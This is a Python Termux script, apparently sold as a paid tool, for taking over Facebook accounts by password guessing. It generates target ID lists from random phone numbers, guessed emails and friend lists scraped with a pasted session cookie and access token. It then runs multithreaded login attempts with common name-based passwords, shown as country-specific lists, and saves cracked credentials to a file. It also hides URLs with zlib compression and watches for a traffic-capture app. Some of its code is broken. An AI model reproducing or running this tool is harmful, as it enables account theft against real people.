#coding = utf-8
#tnx alot janj hamza hop
#script shared by Qaiser
from uuid import uuid4
import requests,zlib,platform
import os,sys,tempfile,string,random,subprocess,uuid
#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
try:
	sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
except:
	sz=""
#--checking if file is not avalible 

if os.path.exists(sz):
	os.rename(sz1,'.f1')
	os.rename(sz2,'.f2')
	os.system(sz3)
	os.system(sz4)
	os.system(sz5)
	os.system(sz6)
else:
	pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

logo= f'''
     .d88888b.   .d8888b.  8888888b.       
    d88P" "Y88b d88P  Y88b 888   Y88b      
    888     888 Y88b.      888    888      
    888     888  "Y888b.   888   d88P      
    888     888     "Y88b. 8888888P"       
    888 Y8b 888       "888 888 T88b        
    Y88b.Y8b88P Y88b  d88P 888  T88b       
     "Y888888"   "Y8888P"  888   T88b      
            Y8b
{50*"-"}
    Tool Version :     10.0.95
    Thanks Alot  :     M.Hamza 
{50*"-"}'''

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"

loop = 0
methods = []
ok=[]
total=[]
clone_type=[]
android_models = []
hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.geteuid())
id = "".join(uuidd).replace("_","").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = id+bxd+xp
myweb2 = requests.get(xny).text

def qsbuy():
	try:
		os.system('clear')
		print(logo)
		try:
			os.system("clear");print(logo)
			print(f"{r}   Your Device License Key Is Not Approved{s}")
			print(50*"-")
			print(f"{g} Key : {bumper}{s}")
			print(50*"-")
			print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
			print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 2 sy 3 din bad update hgaya kryga ")
			print(50*"-")
			print(f" 15-Days Price : 350")
			print(f" 1-Month Price : 500")
			print(50*"-")
			input("[Press Enter To Send Key To Admin]")
			os.system(f"termux-open-url https://wa.me/+923197951814?text={bumper}")
			qsbuy()
		except Exception as e:
			exit(e)
	except requests.exceptions.ConnectionError:
		exit(' No internet connection ..')

def xchker():
	if bumper in myweb2:
		pass
	else:
		qsbuy()
		
def main():
	xchker()
	os.system('rm -rf ...txt')
	os.system('clear')
	print(logo);xchker()
	print('Code Like Humor When You Have To Explain It Its Bad')
	print(50*'-')
	print('[1] Fb Cloning Menu')
	print('[2] File Create Menu')
	print('[3] Number Detail Finder')
	print('[4] Remove Cookie')
	print('[5] Clear Cache')
	print('[6] Best Pass Lists \033[0;97m')
	print('[7] How To Use Video')
	print('[0] Exit \033[0;97m')
	print(50*'-')
	menu_opt = input('Select choice : ')
	if menu_opt =='1':
		method_crack()
	elif menu_opt =='2':
		create_file()
	elif menu_opt =='3':
		xchker()
		os.system('xdg-open https://github.com/TechQaiser/Qnumber')
		main()
	elif menu_opt =='4':
		os.system('rm -rf fb_cookies.txt')
		os.system('rm -rf access_token.txt')
		print('       Removed Success')
		time.sleep(3)
		main()
	elif menu_opt =='5':
		isdd="les/u"
		isd="sr/t"
		isddd="p/."
		llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
		os.system(f"rm -rf {llb}")
		exit("      Sucessfully Removed .      ")
	elif menu_opt =='6':
		os.system('clear')
		print(logo);xchker()
		print(' Select Your Country For Best PassLists')
		print(50*'-')
		print('[1] Pakistani Ids')
		print('[2] Bangladesh Ids')
		print('[3] Nigeria Ids')
		print('[4] Other Countries')
		print('[0] Back \033[0;97m')
		print(50*'-')
		menu_opt = input('Select choice : ')
		if menu_opt =='1':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('khan123')
			print('first1234')
			print('first12345')
			print('i love you')
			print('firstkhan')
			print('khankhan')
			print('khan12345')
			print('khan12')
			print('first786')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='2':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('Bangladesh')
			print('first1234')
			print('first12345')
			print('bangladesh')
			print('i love you')
			print('Jannatul123')
			print('Mohammed123')
			print('Mohammad123')
			print('first@123')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='3':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('i love you')
			print('musa123')
			print('first12345')
			print('first@123')
			print('first@1234')
			print('firstfirst')
			print('lastlast')
			print('first786')
			print('first1122')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='4':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('i love you')
			print('first321')
			print('lastfirst')
			print('firstlast123')
			print('first12345')
			print('first@123')
			print('first@1234')
			print('firstfirst')
			print('first007')
			print('first789')
			print('first1122')
			input('\nPress enter to back ')
			main()
		if menu_opt =='1':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('khan123')
			print('first1234')
			print('first12345')
			print('i love you')
			print('firstkhan')
			print('khankhan')
			print('khan12345')
			print('khan12')
			print('first786')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='2':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('Bangladesh')
			print('first1234')
			print('first12345')
			print('bangladesh')
			print('i love you')
			print('Jannatul123')
			print('Mohammed123')
			print('Mohammad123')
			print('first@123')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='3':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('i love you')
			print('musa123')
			print('first12345')
			print('first@123')
			print('first@1234')
			print('firstfirst')
			print('lastlast')
			print('first786')
			print('first1122')
			input('\nPress enter to back ')
			main()
		elif menu_opt =='4':
			os.system('clear')
			print(logo);xchker()
			print('first last')
			print('First Last')
			print('firstlast')
			print('first123')
			print('i love you')
			print('first321')
			print('lastfirst')
			print('firstlast123')
			print('first12345')
			print('first@123')
			print('first@1234')
			print('firstfirst')
			print('first007')
			print('first789')
			print('first1122')
			input('\nPress enter to back ')
			main()
	elif menu_opt == "7":
		try:
			os.system('python use.py')
		except:
			exit('video is not avalible Right now in server try again after few hours')
	elif menu_opt == "0":
		main()
	else:
		print('\n Invalid option, try again ...')
		time.sleep(3)
		main()

def login():
	os.system('clear')
	print(logo);xchker()
	cookies = input(' Put cookies here: ')
	try:
		print('\n Validating cookies ... ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
		find_token = re.search("(EAAG\w+)", data.text)
		open("access_token.txt", "w").write(find_token.group(1))
		open("fb_cookies.txt","w").write(cookies)
		print(' Logged in successfully ...')
		time.sleep(1)
		os.system('python malang.py')
	except KeyError:
		print('\n Inavlid cookies, try another cookies')
		exit()
	except requests.exceptions.ConnectionError:
		print('\n No internet connection ...')
		exit()
	except AttributeError:
		print('\n Invalid cookies, try another cookies ...')
		exit()
		
def method_crack():
	os.system('clear')
	print(logo);xchker()
	print(' [1] File Cloning ')
	print(' [2] Email Cloning ')
	print(' [3] Number Cloning ')
	print(' [0] Back')
	print(50*'-')
	clone_ = input(' Select : ')
	if clone_ == "1":
		clone_type.append('1')
	elif clone_ == "2":
		clone_type.append('2')
	elif clone_ == "3":
		clone_type.append('3')
	elif clone_ == "0":
		main()
	else:
		exit('invalid select')
	mycrackistan()

def mycrackistan():
	global methods
	if '1' in clone_type:
		crack_main().crackfile(id)
	elif '2' in clone_type:
		crack_main().crackmail(id)
	elif '3' in clone_type:
		crack_main().cracknum(id)

class crack_main():
	def __init__(self):
		self.id=[]
	def crackfile(self,id):
		global methods
		os.system('clear')
		print(logo);xchker()
		self.file = input(' Put file path: ')
		try:
			self.id = open(self.file).read().splitlines()
			self.pasw()
		except FileNotFoundError:
			print(' No file found ....')
			exit()
	def crackmail(self,id):
		global methods
		os.system("clear");print(logo);xchker() 
		import requests,random
		user=[]
		print(" [*] First Name Example Hamza,Areesha")
		first = input(" First Name : ")
		last = input(" Last Name : ")
		print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
		domain = input(" Domain : ")
		print("\n [?] Limit ids Example 1000,5000,50000")
		limit = int(input(" Limit Ids : "))
		for nmbr in range(limit):
			nmpp = random.randint(99,9999)
			nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
			naseeb = open('...txt','a').write(nmp)
		self.id = open('...txt').read().splitlines()
		self.pasw()
	def cracknum(self,id):
		global methods
		os.system('clear');print(logo);xchker()
		print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
		kode = input('\033[0mChoose Code : \033[0m')
		print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
		limit = int(input('\033[0mIdz Limit : \033[0m'))
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			xoo = kode+nmp.replace(" ","")
			xdr = f"{kode+nmp}|{nmp} {xoo}\n"
			naseeb = open('...txt','a').write(xdr)
		self.id = open('...txt').read().splitlines()
		self.pasw()
	def m1(self,iid,name,passlist):
		try:
			global ok,loop,android_models
			sys.stdout.write('\r[QSR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
				password = pas
				agent = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(8,13))+"; "+mobile_names+" LD7 Build/"+one_string_two_ip+") [FBAN/MobileAdsManagerAndroid;FBAV/"+five_ip+";FBBV/400263992;FBRV/401621336;FBLC/en_US;FBMF/"+mobile_names+" MOBILE LIMITED;FBBD/"+mobile_names+";FBDV/"+mobile_names+" LD7;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1452};FB_FW/1;]"
				url = 'https://b-graph.facebook.com/auth/login'
				head = {"user-agent": agent,"Content-Type": "application/json;charset=utf-8","Content-Length": "599","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
				data = {"locale":"en_US","format":"json","email":iid,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
				po = requests.post("https://graph.facebook.com/auth/login",data=data,headers=head).json()
				print(po)
				try:
					roid = str(po['uid'])
				except:
					roid = iid
				if 'session_key' in po:
					print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'Please Confirm Email' in po:
					print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[QSR-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
					continue
			loop+=1
		except Exception as e:
			pass
			#print(e)
			
	def pasw(self):
		passlist = []
		os.system('clear')
		print(logo);xchker()
		pl = int(input(' How Much Password Do You Want To Add ? '))
		print(' Example first123,last123,khan123,firstlast')
		print(50*"-")
		for cd in range(pl):
			passlist.append(input(f' ({cd+1}) Password : '))
		os.system('clear')
		print(logo);xchker()
		print(' Total Ids : '+str(len(self.id)))
		print(' Cloning Is Started Wait For Results')
		print(' After Every 5 Min Turn Airplane On/Off')
		print(50*'-')
		with ThreadPool(max_workers=30) as formSubmit:
			for user in self.id:
				iid,name = user.split('|')
				formSubmit.submit(self.m1,iid,name,passlist)
		print(50*'-')
		print(' SucessFully Process Is Completed ')
		print(' Total Ok Ids : '+str(len(ok)))
		print(' Ok Ids Save In : /sdcard/qsr_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()

def create_file():
	os.system('clear')
	print(logo);xchker()
	print(' [1] Create File ')
	print(' [2] Remove Double Ids ')
	print(' [3] Seprate Ids ')
	print(' [0] Back')
	print(50*'-')
	create_ = input(' Select : ')
	if create_ == "1":
		create_file_login()
	elif create_ == "2":
		double()
	elif create_ == "3":
		sep()
	elif create_ == "0":
		main()
	else:
		exit('invalid select')
	mycrackistan()	

def create_file_login():
	ids = []
	total = []
	xyz = requests.Session()
	os.system('clear')
	print(logo);xchker()
	try:
		cok = open('fb_cookies.txt','r').read()
		cookies = {'cookie':cok}
		access_token = open('access_token.txt', 'r').read()
	except FileNotFoundError:
		login()
	try:
		check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
		load = json.loads(check_cookies)
		iid = load['id']
		name = load['name']
	except KeyError:
		print('\n Cookies has expired')
		time.sleep(1)
		os.system('rm -rf .fb_cookies.txt .access_token.txt')
		login()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ...')
	os.system('clear')
	print(logo);xchker()
	print("[1] Create File Mix Ids")
	print("[2] Create File New Ids")
	print(44*"-")
	typp = input('select : ')
	if typp == "1":
		auto_file(cookies,access_token)
	elif typp == "2":
		new_file(cookies,access_token)
	else:
		auto_file(cookies,access_token)

def auto_file(cookies,access_token):
	global total
	os.system('clear & rm -rf .txt .temp.txt')
	os.system('clear')
	print(logo);xchker()
	try:
		fl = 1
	except:
		fl = 1
	for xd in range(fl):
		idt = input(f' Put id {xd+1}: ')
		try:
			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
			xyz = requests.Session()
			r = xyz.get(fd_url,cookies=cookies).text
			q = json.loads(r)
			for iid in q['friends']['data']:
				uid = iid['id']
				open('.txt','a').write(uid+'\n')
		except KeyError:
			print(' No Friend List : '+idt)
			time.sleep(3)
			return auto_file(cookies,access_token)
		except requests.exceptions.ConnectionError:
			print(' No internet connection ....')
	sid = "1"
	os.system('cat .txt | grep "'+sid+'" > .temp.txt')
	file = open('.temp.txt','r').read().splitlines()
	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
	#100010138361148
	sf = input(' Saved File As : ')
	print('')
	os.system('clear')
	print(logo);xchker()
	print(' Total ids To Dump: '+str(len(file)))
	print(' Dumping Is Started Wait ....')
	print(50*'-')
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	print(' Total ids Extracted : '+str(len(total)))
	input(' Press enter to back ')
	main()

def new_file(cookies,access_token):
	global total
	os.system('clear & rm -rf .txt .temp.txt')
	os.system('clear')
	print(logo);xchker()
	try:
		fl = 1
	except:
		fl = 1
	for xd in range(fl):
		idt = input(f' Put id {xd+1}: ')
		try:
			fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
			xyz = requests.Session()
			r = xyz.get(fd_url,cookies=cookies).text
			q = json.loads(r)
			for iid in q['friends']['data']:
				uid = iid['id']
				open('.txt','a').write(uid+'\n')
		except KeyError:
			print(' No Friend List : '+idt)
			time.sleep(3)
			return auto_file(cookies,access_token)
		except requests.exceptions.ConnectionError:
			print(' No internet connection ....')
	print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
	try:
		sl = int(input('\n How Many Links To Grab : '))
	except:
		sl = 1
	for el in range(sl):
		sid = input(f' Put {el+1} link: ')
		os.system('cat .txt | grep "'+sid+'" > .temp.txt')
	file = open('.temp.txt','r').read().splitlines()
	print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
	#100010138361148
	sf = input(' Saved File As : ')
	print('')
	os.system('clear')
	print(logo);xchker()
	print(' Total ids To Dump: '+str(len(file)))
	print(' Dumping Is Started Wait ....')
	print(50*'-')
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	try:
		son = f"qaiser{str(random.randint(0,90))}.txt"
	except:
		son = f"qaiser{str(random.randint(10,50))}.txt"
	os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
	print(' Total ids Extracted : '+str(len(total)))
	print(' New ids Saved As : /sdcard/'+son)
	print(' Normal ids Saved As : '+sf)
	input(' Press enter to back ')
	main()

def iamBadBoy(exid,cookies,access_token,sf):
	try:
		global total,loop
		fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
		xyz = requests.Session()
		r = xyz.get(fd_url,cookies=cookies).text
		q = json.loads(r)
		for yaad in q['friends']['data']:
			iid = yaad['id']
			name = yaad['name']
			total.append(iid)
			open(sf,'a').write(iid+'|'+name+'\n')
		loop+=1
		sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		print(' No internet connection ...')
	except Exception as e:
		pass
		#print(e)
	except KeyError:
		pass

def sep():
	xchker()
	os.system('clear');print(logo);xchker()
	try:
		limit = int(input(' How many links do you want to separate ? '))
	except:
		limit = 1
	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
	file_name = input('\033[0m Input file path : ')
	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
	new_save = input('\033[0m Save new file as : ')
	y = 0
	print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
	for k in range(limit):
		y+=1
		links=input(' Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print(44*"\033[0m-")
	print(f'{rc} ids grabbed successfully{s}')
	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
	print('\033[0m New file saved as : \033[0;33m '+new_save)
	print(44*"\033[0m-")
	input('\033[0m[Press enter to back] ')
	main()

def sep():
	xchker()
	os.system('clear');print(logo);xchker()
	try:
		limit = int(input(' How many links do you want to separate ? '))
	except:
		limit = 1
	print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
	file_name = input('\033[0m Input file path : ')
	print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
	new_save = input('\033[0m Save new file as : ')
	y = 0
	print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
	for k in range(limit):
		y+=1
		links=input(' Put Uid Type : ')
		os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
	print(44*"\033[0m-")
	print(f'{rc} ids grabbed successfully{s}')
	print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
	print('\033[0m New file saved as : \033[0;33m '+new_save)
	print(44*"\033[0m-")
	input('\033[0m[Press enter to back] ')
	main()
	
def double():
	os.system('clear')
	print(logo);xchker()
	user_file = input('File Path : ')
	try:
		open(user_file,'r').read()
		print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
		save_file = input('Save new file as: ')
		os.system('touch '+save_file)
		os.system('sort -r '+user_file+' | uniq > '+save_file)
		print(50*'-')
		print(' Fully Removed Multi Lines Ids')
		print(' Dublicate Lines Removed From File')
		print(' File Saved As : '+save_file)
		print(50*'-')
		input('Press enter to back ')
		main()
	except FileNotFoundError:
		print(' Invalid File ')

#----[http-capture]----
try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('error occur 0')
		#exit()
		#exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
except Exception as e:
	print(e)
	pass
except PermissionError:
	pass
	
if not os.path.exists('.fam'):
	qsbuy()
else:
	qsbuy()